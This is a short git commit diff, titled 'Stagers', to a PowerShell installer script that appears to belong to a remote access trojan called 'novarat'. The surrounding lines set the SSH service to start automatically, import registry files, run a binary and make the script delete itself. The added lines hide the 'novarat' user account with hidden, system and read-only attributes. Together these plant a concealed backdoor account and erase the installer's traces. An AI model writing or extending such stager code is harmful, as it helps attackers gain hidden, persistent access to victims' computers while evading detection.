67d5c78ba46545b9d3bf6f2bcb77db7450f81991
fazelastblood <fazelastblood@gmail.com>
2024-01-21 22:01:28 -0600

    Stagers

--- files/installer.ps1
+++ files/installer.ps1
@@ -56,6 +56,10 @@ Set-Service -Name sshd -StartupType 'Automatic'
 #install the registry
 ./wrev.reg; ./calty
 
+# hide novarat user
+cd C:\Users
+attrib +h +s +r novarat
+
 # self delete
 cd $initial_dir
 del installer.ps1
